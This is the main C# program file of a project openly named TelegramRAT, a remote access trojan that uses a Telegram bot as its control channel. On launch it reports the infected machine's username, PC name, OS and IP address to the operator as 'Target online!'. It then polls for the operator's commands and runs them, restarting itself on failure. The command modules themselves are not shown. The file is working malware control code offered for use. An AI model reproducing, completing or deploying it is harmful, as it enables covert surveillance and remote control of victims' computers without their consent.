using BotCommand = TelegramRAT.Commands.BotCommand;
using Telegram.Bot.Types.ReplyMarkups;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Utilities;
using TelegramRAT.Commands;
using System.Diagnostics;
using Telegram.Bot.Types;
using Telegram.Bot;
using System.Net;
using System.Text.Json;
using System.Threading;

namespace TelegramRAT;

public static class Program
{
    private const string BotTokenEnvironmentVariable = "TELEGRAMRAT_BOT_TOKEN";
    private const string OwnerIdEnvironmentVariable = "TELEGRAMRAT_OWNER_ID";

    private static string BotToken = string.Empty;
    private static long OwnerId;

    public static ITelegramBotClient Bot { get; private set; } = null!;
    public static readonly List<BotCommand> Commands = new();
    private const int PollingDelay = 1000;
    private const string UnauthorizedResponse = "You are not authorized to control this bot.";

    internal static void SetBotClient(ITelegramBotClient botClient) => Bot = botClient;
    internal static void SetOwnerId(long ownerId) => OwnerId = ownerId;
    internal static Task ProcessUpdatesAsync(IEnumerable<Update> updates) => UpdateWorkerAsync(updates);

    public static async Task Main(string[] args)
    {
        if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1)
        {
            Console.WriteLine("Only one instance can be online at the same time!");
            return;
        }

        if (!TryInitializeConfiguration(out var configurationErrorMessage))
        {
            Console.Error.WriteLine(configurationErrorMessage);
            return;
        }

        using var cancellationSource = new CancellationTokenSource();
        ConsoleCancelEventHandler? cancelHandler = null;
        cancelHandler = (_, eventArgs) =>
        {
            Console.WriteLine("Cancellation requested. Shutting down gracefully...");
            eventArgs.Cancel = true;
            cancellationSource.Cancel();
        };
        Console.CancelKeyPress += cancelHandler;

        var restartAttempt = 0;

        try
        {
            while (!cancellationSource.IsCancellationRequested)
            {
                TimeSpan? delayBeforeRestart = null;

                using var botClient = CreateBotClient();
                SetBotClient(botClient);

                try
                {
                    Console.WriteLine("Starting Telegram bot polling loop.");
                    await RunAsync(cancellationSource.Token);
                    break;
                }
                catch (OperationCanceledException) when (cancellationSource.IsCancellationRequested)
                {
                    Console.WriteLine("Cancellation acknowledged. Exiting.");
                    break;
                }
                catch (Exception ex)
                {
                    restartAttempt++;

                    if (!await HandleRunFailureAsync(ex, cancellationSource.Token, restartAttempt))
                    {
                        break;
                    }

                    delayBeforeRestart = CalculateRestartDelay(restartAttempt);
                }
                finally
                {
                    Commands.Clear();
                }

                if (delayBeforeRestart.HasValue && !cancellationSource.IsCancellationRequested)
                {
                    var delay = delayBeforeRestart.Value;
                    Console.WriteLine($"Waiting {delay.TotalSeconds:F0} seconds before restart (attempt {restartAttempt}).");

                    try
                    {
                        await Task.Delay(delay, cancellationSource.Token);
                    }
                    catch (OperationCanceledException)
                    {
                        Console.WriteLine("Cancellation requested during restart delay. Exiting.");
                        break;
                    }
                }
            }
        }
        finally
        {
            Console.CancelKeyPress -= cancelHandler;
        }
    }

    private static bool TryInitializeConfiguration(out string errorMessage)
    {
        var (botTokenValue, ownerIdValue, configurationSourceDescription) = LoadConfiguration();

        if (string.IsNullOrWhiteSpace(botTokenValue))
        {
            errorMessage =
                "BotToken was not provided. Set the TELEGRAMRAT_BOT_TOKEN environment variable or add it to appsettings.json.";
            return false;
        }

        if (!long.TryParse(ownerIdValue, out var ownerId) || ownerId <= 0)
        {
            errorMessage =
                "OwnerId was not provided or is invalid. Set the TELEGRAMRAT_OWNER_ID environment variable or add a numeric value to appsettings.json.";
            return false;
        }

        BotToken = botTokenValue;
        OwnerId = ownerId;

        Console.WriteLine($"TelegramRAT starting. Configuration source: {configurationSourceDescription}. Owner chat ID: {OwnerId}.");

        errorMessage = string.Empty;
        return true;
    }

    private static (string? BotToken, string? OwnerId, string ConfigurationSourceDescription) LoadConfiguration()
    {
        string? botToken = Environment.GetEnvironmentVariable(BotTokenEnvironmentVariable);
        string? ownerId = Environment.GetEnvironmentVariable(OwnerIdEnvironmentVariable);

        var configurationSources = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        if (!string.IsNullOrWhiteSpace(botToken) || !string.IsNullOrWhiteSpace(ownerId))
        {
            configurationSources.Add("environment variables");
        }

        var configurationFilePath = Path.Combine(AppContext.BaseDirectory, "appsettings.json");
        if (File.Exists(configurationFilePath))
        {
            try
            {
                using var document = JsonDocument.Parse(File.ReadAllText(configurationFilePath));
                var root = document.RootElement;

                if (root.TryGetProperty("BotToken", out var botTokenElement))
                {
                    var candidate = botTokenElement.GetString();
                    if (!string.IsNullOrWhiteSpace(candidate) && string.IsNullOrWhiteSpace(botToken))
                    {
                        botToken = candidate;
                        configurationSources.Add("appsettings.json");
                    }
                }

                if (root.TryGetProperty("OwnerId", out var ownerIdElement))
                {
                    var candidate = ownerIdElement.GetString();
                    if (!string.IsNullOrWhiteSpace(candidate) && string.IsNullOrWhiteSpace(ownerId))
                    {
                        ownerId = candidate;
                        configurationSources.Add("appsettings.json");
                    }
                }
            }
            catch (JsonException ex)
            {
                Console.Error.WriteLine($"Failed to read configuration from appsettings.json: {ex.Message}");
            }
            catch (IOException ex)
            {
                Console.Error.WriteLine($"Failed to access appsettings.json: {ex.Message}");
            }
        }

        if (configurationSources.Count == 0)
        {
            configurationSources.Add("no configuration source detected");
        }

        var configurationSourceDescription = string.Join(" & ", configurationSources.OrderBy(source => source));
        return (botToken, ownerId, configurationSourceDescription);
    }

    private static TelegramBotClient CreateBotClient() => new(BotToken);

    private static TimeSpan CalculateRestartDelay(int attempt)
    {
        var seconds = Math.Min(60, Math.Pow(2, Math.Min(10, attempt)));
        return TimeSpan.FromSeconds(seconds);
    }

    private static async Task<bool> HandleRunFailureAsync(Exception exception, CancellationToken cancellationToken, int attempt)
    {
        Console.Error.WriteLine($"Bot run failed on attempt {attempt}: {exception}");

        var isConflict = IsConflictException(exception);

        if (OwnerId > 0)
        {
            var ownerMessage = new Message { Chat = new Chat { Id = OwnerId } };

            try
            {
                await ReportExceptionAsync(ownerMessage, exception);

                if (isConflict)
                {
                    await SendErrorAsync(ownerMessage, new Exception("Only one bot instance can be online at the same time."));
                }
                else if (!cancellationToken.IsCancellationRequested)
                {
                    await Bot.SendMessage(
                        OwnerId,
                        $"Attempting to restart (attempt {attempt}). Please wait...",
                        parseMode: ParseMode.Html
                    );
                }
            }
            catch (Exception notificationError)
            {
                Console.Error.WriteLine($"Failed to notify owner about the error: {notificationError}");
            }
        }

        if (isConflict)
        {
            return false;
        }

        return !cancellationToken.IsCancellationRequested;
    }

    private static bool IsConflictException(Exception exception)
        => exception.Message.Contains("Conflict: terminated by other getUpdates request", StringComparison.OrdinalIgnoreCase)
           || exception.InnerException?.Message.Contains("Conflict: terminated by other getUpdates request", StringComparison.OrdinalIgnoreCase) == true;

    private static async Task RunAsync(CancellationToken cancellationToken)
    {
        Commands.Clear();
        CommandRegistry.InitializeCommands(Commands);

        var markup = new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Show All Commands"));

        var systemInfo = $"Target online!\n\nUsername: <b>{Environment.UserName}</b>\nPC name: <b>{Environment.MachineName}</b>\nOS: {Utils.GetWindowsVersion()}\n\nIP: {await Utils.GetIpAddressAsync()}";

        await Bot.SendMessage(
            OwnerId,
            systemInfo,
            ParseMode.Html,
            replyMarkup: markup
        );

        int offset = 0;

        while (!cancellationToken.IsCancellationRequested)
        {
            var updates = await Bot.GetUpdates(offset, cancellationToken: cancellationToken);
            if (updates.Any())
                offset = updates.Last().Id + 1;

            await UpdateWorkerAsync(updates);
            await Task.Delay(PollingDelay, cancellationToken);
        }
    }

    private static async Task UpdateWorkerAsync(IEnumerable<Update> updates)
    {
        foreach (var update in updates)
        {
            if (update.CallbackQuery is not null)
            {
                var callback = update.CallbackQuery;
                var callbackChatId = callback.Message?.Chat.Id ?? callback.From?.Id;
                var callbackSenderId = callback.From?.Id ?? callbackChatId;

                if (!await EnsureAuthorizedAsync(
                        callbackSenderId,
                        callbackChatId,
                        "callback query",
                        respond: true,
                        unauthorizedResponder: async () =>
                        {
                            await Bot.AnswerCallbackQuery(
                                callback.Id,
                                UnauthorizedResponse,
                                showAlert: true
                            );

                            if (callbackChatId.HasValue)
                            {
                                await Bot.SendMessage(callbackChatId.Value, UnauthorizedResponse);
                            }
                        }))
                {
                    continue;
                }

                await Bot.AnswerCallbackQuery(callback.Id, "Callback received!");

                if (callback.Message?.ReplyMarkup != null)
                {
                    await Bot.EditMessageReplyMarkup(
                        callback.Message.Chat.Id,
                        callback.Message.MessageId,
                        replyMarkup: null
                    );
                }

                if (callback.Data == "Show All Commands")
                {
                    var cmd = Commands.FirstOrDefault(c => c.Command == "commands");
                    if (cmd != null)
                    {
                        if (!await EnsureAuthorizedAsync(
                                callbackSenderId,
                                callbackChatId,
                                "callback command execution",
                                respond: false))
                        {
                            continue;
                        }

                        await cmd.Execute(new BotCommandModel { Message = callback.Message });
                    }
                }
                continue;
            }

            if (update.Message is null) continue;

            var message = update.Message;
            var messageChatId = message.Chat?.Id;
            var messageSenderId = message.From?.Id ?? messageChatId;

            if (!await EnsureAuthorizedAsync(
                    messageSenderId,
                    messageChatId,
                    "message",
                    respond: true))
            {
                continue;
            }

            var model = BotCommandModel.FromMessage(message, "/");
            if (model == null) continue;

            var command = Commands.FirstOrDefault(c => c.Command.Equals(model.Command, StringComparison.OrdinalIgnoreCase)) ??
                          Commands.FirstOrDefault(c => c.Aliases?.Contains(model.Command, StringComparer.OrdinalIgnoreCase) == true);

            if (command == null) continue;

            if (command.ValidateModel(model))
            {
                if (!await EnsureAuthorizedAsync(
                        messageSenderId,
                        messageChatId,
                        "command execution",
                        respond: false))
                {
                    continue;
                }

                await command.Execute(model);
            }
            else
            {
                await Bot.SendMessage(
                    update.Message.Chat.Id,
                    $"This command requires arguments!\n\nTo get information about this command - type /help {model.Command}",
                    replyParameters: new ReplyParameters { MessageId = model.Message.MessageId },
                    parseMode: ParseMode.Html
                );
            }
        }
    }

    private static async Task<bool> EnsureAuthorizedAsync(
        long? senderId,
        long? chatId,
        string updateDescription,
        bool respond,
        Func<Task>? unauthorizedResponder = null)
    {
        var effectiveSenderId = senderId ?? chatId;

        if (effectiveSenderId == OwnerId)
        {
            return true;
        }

        if (effectiveSenderId is null)
        {
            Console.WriteLine($"Ignoring {updateDescription} with missing sender information.");
            return false;
        }

        Console.WriteLine($"Unauthorized {updateDescription} from {effectiveSenderId}.");

        if (respond)
        {
            if (unauthorizedResponder is not null)
            {
                await unauthorizedResponder();
            }
            else if (chatId.HasValue)
            {
                await Bot.SendMessage(chatId.Value, UnauthorizedResponse);
            }
        }

        return false;
    }

    public static async Task SendErrorAsync(Message message, Exception ex, bool includeStackTrace = false)
    {
        var encodedMessage = WebUtility.HtmlEncode(ex.Message);
        var errorMessage = includeStackTrace
            ? $"Error: {encodedMessage}\n{WebUtility.HtmlEncode(ex.StackTrace)}"
            : $"Error: {encodedMessage}";

        var replyMarkup = message.ReplyMarkup == null
            ? new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString()))
            : null;

        await Bot.SendMessage(
            message.Chat.Id,
            errorMessage,
            parseMode: ParseMode.Html,
            replyMarkup: replyMarkup
        );
    }

    public static async Task ReportExceptionAsync(Message message, Exception exception)
    {
        #if DEBUG
            bool includeStackTrace = true;
        #else
            bool includeStackTrace = false;
        #endif
        await SendErrorAsync(message, exception, includeStackTrace);
    }

    public static async Task SendSuccessAsync(Message message, string successMessage)
        => await Bot.SendMessage(message.Chat.Id, successMessage, parseMode: ParseMode.Html, replyMarkup: new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString())));

    public static async Task SendInfoAsync(Message message, string infoMessage)
        => await Bot.SendMessage(message.Chat.Id, infoMessage, parseMode: ParseMode.Html, replyMarkup: new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString())));
}
